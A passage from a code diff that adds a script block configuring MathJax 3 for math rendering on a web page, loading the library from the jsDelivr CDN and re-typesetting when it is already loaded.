+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
